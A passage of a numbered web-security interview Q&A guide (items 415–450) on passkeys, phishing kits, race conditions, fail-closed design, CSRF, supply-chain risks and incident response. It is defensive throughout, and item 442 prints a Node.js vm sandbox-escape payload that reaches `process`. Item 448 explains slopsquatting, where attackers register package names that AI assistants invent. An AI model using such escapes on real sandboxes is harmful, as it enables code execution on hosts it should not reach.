Sessions after login still use secure cookies. Passkeys change how users authenticate, not how the session is kept.

## 415: What does the WebAuthn server need to verify during login?

- The challenge matches the one the server issued for this attempt, and is used once.
- The origin in `clientDataJSON` is your expected origin.
- The RP ID hash in the authenticator data matches your RP ID.
- The user presence flag is set, and user verification is set if you require it.
- The signature is valid for the stored public key of that credential.
- The signature counter, if non-zero, has increased (helps detect cloned authenticators, though synced passkeys usually report 0).

Use a maintained library like SimpleWebAuthn instead of writing this by hand.

## 416: How do you defend against adversary-in-the-middle phishing kits like Evilginx?

These kits proxy the real login page, so the victim types their password and MFA code into a fake site that forwards them live, and the attacker captures the session cookie. Normal MFA (TOTP, SMS, push) does not stop it. Defenses: phishing-resistant authentication (passkeys, FIDO2 hardware keys) that checks the origin, detection of logins from proxy infrastructure, and device-bound session credentials that make stolen cookies useless on another device.

## 417: What is the Device Bound Session Credentials (DBSC) proposal?

DBSC is a browser feature led by Google that ties a session to a private key stored in the device's secure hardware (like a TPM). The server periodically asks the browser to prove it holds that key and only then issues short-lived session cookies. If malware steals the cookies, they expire quickly and cannot be refreshed from another machine. It targets cookie theft by infostealer malware, which became one of the most common ways accounts are taken over.

## 418: How do you design a secure API key format?

A good design looks like `acme_live_8f3k...` with:

- A prefix with your company and environment, so secret scanners (including GitHub's partner program) can detect leaks and you can tell test from live keys.
- At least 128 bits of random data.
- Optionally a checksum, so typos and fake keys can be rejected without a database call.
- Only a hash stored on the server, plus a short visible part for users to identify the key.

Register the format with GitHub secret scanning so leaked keys are reported to you automatically.

## 419: How would you investigate a suspected IDOR exploitation from logs?

- Look for one user or IP accessing many different object IDs in a short time, especially sequential ones.
- Compare accessed object owners with the requester (join logs with ownership data).
- Check for spikes in 403 or 404 responses on object endpoints before any successful access.
- Check for unusual API clients or user agents.
- Identify which records were exposed and whose data they had, since you may need to notify those users.

This only works if logs include the user ID, object ID and response status, which is a good reason to log them.

## 420: How do you test for race conditions in a web app?

- Find operations that should only happen once or are limited: coupons, transfers, votes, invites, token use, limits on resources.
- Send many identical requests at the same time. Burp Repeater can send a group of requests in parallel using the single-packet technique, and Turbo Intruder can send large bursts.
- Check whether the limit was broken (two redemptions, negative balance).
- Repeat a few times, since races are not always reproducible.
- In code, look for "read, check, then write" patterns that are not inside a transaction or atomic statement.

## 421: Why can transactions alone fail to prevent race conditions?

The default isolation level in most databases (Read Committed in PostgreSQL) still allows two transactions to read the same value and both decide to proceed. To prevent it you need one of:

- `SELECT ... FOR UPDATE` to lock the row.
- A conditional atomic `UPDATE ... WHERE balance >= $1`.
- Unique constraints (for example, one redemption row per user and coupon).
- `SERIALIZABLE` isolation with retries on serialization errors.

Just wrapping code in `BEGIN` and `COMMIT` does not make the read-check-write sequence safe.

## 422: What is a JSON Web Token's "none" equivalent in other formats, and what is the general lesson?

The general issue is "algorithm agility": letting the message say how it should be verified. JWT `alg: none`, SAML signatures that can be removed, and protocols that let the client pick weak ciphers (TLS downgrade attacks like FREAK and Logjam) all come from it. The lesson: the verifier should decide which algorithm and key to use from its own config, not from the attacker-controlled message. Newer token formats like PASETO were designed with fixed algorithms per version for this reason.

## 423: How do you handle security for feature flags and configuration services?

Feature flags can turn on unfinished, unreviewed code paths, and config services control behavior in production. Treat them as sensitive:

- Restrict who can change flags in production, and require approval for risky ones.
- Audit log all flag changes.
- Do not use client-side flags to protect features, since users can flip them. The server must enforce access.
- Remove old flags, since they hide dead code paths that are not tested.
- Make sure the default when the flag service is down is the safe one.

## 424: What are the security risks of client-side feature flags or entitlements?

If the frontend decides what features a user can use based on flags or plan data in the bundle or in `localStorage`, users can change them and unlock paid features or hidden admin tools. The UI can still use flags for display, but every API call must check the user's actual plan and permissions on the server. Also avoid shipping code for unreleased features in public bundles, since people dig through them.

## 425: How would you review a pull request that adds a new "export to CSV" feature?

Check:

- Authorization: can users export only their own data (or their tenant's)?
- Field selection: does the export include sensitive fields that the UI hides?
- CSV injection: are cells starting with `=`, `+`, `-`, `@` escaped?
- Size and rate limits: can someone export millions of rows or call it in a loop?
- Async jobs: if exports run in the background, is the download link random, short-lived and tied to the user?
- Logging: is the export logged with who, what and how many rows?

## 426: What makes an error message an information disclosure problem?

An error message is a problem when it gives an attacker something useful they could not easily get otherwise: database type and query structure (helps SQL injection), file paths and framework versions (helps pick exploits), whether a user exists (helps enumeration), internal hostnames and IPs (helps SSRF), or stack traces with code snippets. The detail should go to logs with a request ID, and the user sees a generic message.

## 427: How can different error handling paths cause access control bypasses?

Some examples:

- Authorization middleware that calls `next(err)` on failure, while a later error handler sends a `200` with partial data.
- A `try/catch` around the permission check that swallows the error and continues.
- Validation that fails on an unusual input type (array instead of string), skipping the check because of an exception.
- A timeout in a call to the policy service treated as "no restrictions".

These are exactly what A10:2025 is about. Test error paths on purpose: make dependencies fail and check that requests are denied.

## 428: How do you test that an app fails closed?

Use fault injection in tests and staging:

- Make the auth or policy service return errors, time out, or return malformed data, and check that protected endpoints deny access.
- Kill the database or cache mid-request and check for partial updates.
- Send malformed input (wrong types, huge values, invalid encoding) and check for clean `400` responses, not crashes or bypasses.
- Use chaos engineering tools in staging to break dependencies.

Add these as automated tests for security-critical paths.

## 429: What is the security impact of not handling resource cleanup on errors?

If an error path skips cleanup, resources leak: open file handles, database connections, locks and temp files. An attacker who can trigger the error repeatedly can exhaust connections or disk and cause a DoS. Locks that are never released can block other users. Temp files with sensitive data might be left on disk. Use `try/finally`, `using` declarations where available, and connection pool timeouts.

```js
const client = await pool.connect();
try {
  await client.query("BEGIN");
  // ...
  await client.query("COMMIT");
} catch (err) {
  await client.query("ROLLBACK");
  throw err;
} finally {
  client.release();
}
```

## 430: How would you secure a multi-step workflow like a loan application?

- Keep the workflow state on the server, not in hidden fields or the URL.
- Check on every step that the previous steps are complete and that the user owns the application.
- Recalculate and re-validate values on the server at the final step, not just trust values from earlier steps.
- Lock the data once submitted, so it cannot be changed after approval.
- Log each step with timestamps.
- Test skipping steps, repeating steps and going back after submission.

## 431: How do you protect against clickjacking on pages that must be embeddable?

If some pages, like a widget, must be framed by partners, allow only specific origins with `frame-ancestors`:

```http
Content-Security-Policy: frame-ancestors https://partner1.com https://partner2.com
```

Keep `frame-ancestors 'none'` on all other pages. Inside the embeddable page, require a real user action for anything sensitive, and for very sensitive actions open a popup or new tab on your own site instead of doing it inside the iframe. The newer Intersection Observer v2 can help detect if the frame is hidden or covered.

## 432: Why can SameSite=Lax cookies still be bypassed for CSRF?

- `GET` requests that change state still get the cookie on top-level navigation.
- Chrome has a two-minute window where newly set cookies without an explicit `SameSite` are sent on cross-site `POST` (the "Lax + POST" exception), to avoid breaking some login flows.
- "Same site" includes all subdomains of the registrable domain, so XSS or takeover on any subdomain can send same-site requests.
- Method override features (`_method=POST` in a `GET`) can turn a navigation into a state change.

That is why `SameSite` is a strong layer but not a full CSRF defense on its own.

## 433: What is the security impact of a single XSS on a site with good CSRF protection?

XSS breaks CSRF protection completely. The injected script runs on your origin, so it can read the CSRF token from the page or cookie and send any request the user can send. It can also read data on the page, change the UI to phish credentials, and on sites without `HttpOnly` cookies, steal the session. This is why XSS is treated as a high-severity bug even when it "only" runs JavaScript.

## 434: How do you approach security in a design review for a new public API?

- Who calls it and how do they authenticate? Users, partners, other services?
- What objects does it expose and how is ownership checked for each one?
- Which fields are read-only, and which can each role change?
- What are the rate limits and maximum sizes?
- What happens on errors and partial failures?
- What does it log and what does it alert on?
- How is it versioned and how will old versions be retired?
- Does it call out to user-supplied URLs or third parties?
- What is the worst thing an attacker with a valid account could do with it?

Record the answers and the agreed controls in the design doc.

## 435: How would you build a security program for a small startup with no security team?

Start with what gives the most protection for the least effort:

1. MFA everywhere (source control, cloud, email, admin panels), ideally passkeys or hardware keys.
2. A secrets manager, and secret scanning on all repos.
3. Dependabot or Renovate, and SCA in CI.
4. Secure defaults in the framework: parameterized queries, escaping, security headers, secure cookies.
5. Central logging with a few key alerts.
6. Backups that are tested and stored separately.
7. A `security.txt` and a simple incident response plan.
8. Use ASVS Level 1 as the baseline and do a pentest before big launches.

## 436: How would you measure whether your application security program is working?

Useful metrics:

- Time to fix vulnerabilities by severity, compared with your targets.
- Number of open critical and high findings over time.
- Share of repos with SAST, SCA and secret scanning enabled.
- Percentage of dependencies on supported versions.
- How many issues are found before production vs after.
- Repeat findings of the same bug class (shows where training or secure defaults are missing).
- Time to detect and respond in incidents and exercises.

Avoid counting only the number of findings, since more scanning makes that number go up even when things improve.

## 437: How do you get developers to actually fix security findings?

- Report findings in the tools they already use: PR comments, the issue tracker, the IDE.
- Keep false positives low, so findings are trusted.
- Give a clear fix with code, not just a CWE number.
- Agree on fix deadlines by severity with engineering leadership.
- Fix whole classes of bugs with shared libraries and secure defaults, so developers do not have to fix the same thing again.
- Train with real examples from your own codebase.
- Celebrate good fixes and good reports, instead of blaming.

## 438: What is the difference between a security control being preventive, detective and corrective?

- Preventive controls stop an attack from working: input validation, authorization checks, MFA, CSP.
- Detective controls notice an attack: logs, alerts, intrusion detection, anomaly detection.
- Corrective controls limit or undo damage: backups, automatic session revocation, incident response, patching.

A good design has all three, because no preventive control is perfect, and without detection you will not know when it fails.

## 439: How would you design security for a browser extension that talks to your web app?

- Request the minimum permissions and host access in the manifest.
- Do not inject scripts into pages you do not need.
- Use `chrome.runtime` messaging with checks on the sender, and use `externally_connectable` to limit which web pages can message the extension.
- Do not trust messages from web pages, since any page can send them.
- Keep tokens in extension storage, not in the page's DOM or `localStorage`.
- Follow Manifest V3 rules: no remote code, strict CSP.
- Sign and publish through the official store, and protect the developer account with MFA, since stolen developer accounts have been used to push malicious updates.

## 440: What is subresource poisoning through a compromised CDN or package host, and how do you limit it?

If you load scripts from a third-party host and that host is compromised or sold, every visitor gets the attacker's code. Polyfill.io in 2024 is the well-known case: the domain was bought and started serving malware to sites that still loaded it. Ways to limit it:

- Self-host third-party scripts when possible.
- Use SRI hashes for fixed versions.
- Use a strict CSP that only allows the hosts you need.
- Keep an inventory of all external scripts and review it regularly.
- Monitor for changes to script content.

## 441: How would you secure a feature where users can write custom code or templates (like email templates)?

Running user code is high risk. Options:

- Use a logic-less template language (like Mustache or Liquid with strict settings) that cannot call arbitrary functions.
- Never use your main template engine (EJS, Pug, Jinja) with user-written templates, since that is SSTI.
- If you must run real code, run it in a strong sandbox: a separate process or container with no network, CPU and memory limits, and timeouts. V8 isolates (like `isolated-vm`) or WebAssembly runtimes are common choices.
- Node.js's `vm` module is not a security sandbox. Its docs say not to use it for untrusted code.

## 442: Why is Node.js's vm module not a security boundary?

`vm` runs code in a different context with its own globals, but in the same process and V8 heap. There are well-known escapes, like reaching the host's `Function` constructor through objects passed in (`this.constructor.constructor('return process')()`), which gives full access to `process` and the file system. Libraries built on it (like the deprecated `vm2`) had repeated critical sandbox escapes. Use process or container isolation, `isolated-vm`, or WebAssembly instead.

## 443: How do you think about security for WebAssembly in the browser?

Wasm runs in the same sandbox as JavaScript, follows the same-origin policy and cannot access the DOM directly. Its main risks are:

- Memory bugs inside the Wasm module (C or C++ code compiled to Wasm can still have buffer overflows, which can corrupt its own memory and change its logic).
- The JavaScript glue code that passes data between Wasm and the DOM can have XSS bugs like any other JS.
- CSP needs `'wasm-unsafe-eval'` to compile Wasm, which is safer than allowing `'unsafe-eval'`.

Treat Wasm modules like any other third-party code in your supply chain.

## 444: How would you secure a real-time collaborative app (like a shared document editor)?

- Authenticate the WebSocket connection and check `Origin`.
- Check document access on join, and on every operation, since permissions can change while connected.
- Re-check access when a user is removed from a document, and disconnect them.
- Validate every operation on the server, since a malicious client can send any message.
- Sanitize rich text before rendering to other users, since stored XSS spreads in real time.
- Rate limit operations per connection and limit document size.
- Log access and changes for auditing.

## 445: How can browser caching leak sensitive data, and how do you prevent it?

Pages with personal data can be stored in the browser cache, the back-forward cache, or shared proxy caches. On a shared computer, the next user can press Back after logout and see the data. Prevent it on sensitive responses with:

```http
Cache-Control: no-store
```

Also send `Clear-Site-Data: "cache", "cookies", "storage"` on logout to tell the browser to remove stored data for your origin. For CDNs, make sure personalized responses are never cached as shared content.

## 446: What is the risk of exposing source maps in production?

Source maps let anyone see your original frontend source code with comments and file structure. That makes it much easier to find hidden endpoints, API keys accidentally put in the bundle, feature flags and logic flaws. The code is still available minified, so this is not a vulnerability on its own, but it lowers the effort for attackers. Upload source maps to your error tracking service privately and do not serve them publicly, unless you have decided the code is fine to be public.

## 447: How would you approach a security review of an app that was mostly written by an AI coding assistant?

Treat it like code from a new developer who is fast but does not know your threat model:

- Check every endpoint for authentication and object-level authorization, since generated code often skips ownership checks.
- Look for hardcoded secrets, disabled TLS checks and permissive CORS added "to make it work".
- Verify that suggested packages actually exist and are the right ones, since models sometimes invent package names that attackers then register ("slopsquatting").
- Check that input validation and error handling are real, not placeholders.
- Run the same SAST, SCA and secret scanning as for any code.

## 448: What is slopsquatting?

Slopsquatting is a supply chain attack where attackers register package names that AI coding assistants tend to make up. When a model suggests `npm install some-helpful-lib` and that package does not exist, an attacker can publish it with malware. Developers who copy the command install it. Defenses: verify every new package (real repository, downloads, maintainers), use registry proxies that block new or unknown packages, and review dependency changes in PRs.

## 449: Scenario: your monitoring shows a spike of successful logins from many IPs to many accounts. What do you do?

This looks like credential stuffing that is working.

1. Confirm: check if the IPs are proxies or cloud ranges, if the accounts have reused passwords in known breaches, and what the sessions did after login.
2. Contain: tighten rate limits, enable bot protection or CAPTCHA on login, block the worst IP ranges, and force MFA or extra verification for affected accounts.
3. Revoke sessions created by the attack and reset passwords for affected accounts.
4. Look for damage: changed emails, payment methods, orders, data exports.
5. Notify affected users.
6. Long term: breached-password checks, MFA by default, passkeys, and alerts that fire earlier.

## 450: If you could make only three security changes to an existing web app, which would you choose and why?

It depends on the app, but a strong default answer is:

1. Fix access control: add central authorization middleware with deny by default and object-level checks, because Broken Access Control is the most common and often the most damaging issue.
2. Turn on MFA (ideally passkeys) and protect login with rate limiting and breached-password checks, because account takeover is one of the most common ways in.
3. Automate dependency and secret scanning in CI with fast patching, because supply chain attacks and leaked secrets give attackers access without needing a bug in your code.

A good answer in an interview also explains how you would check which of these is actually the biggest risk for that specific app, for example with a quick threat model or a look at past incidents.
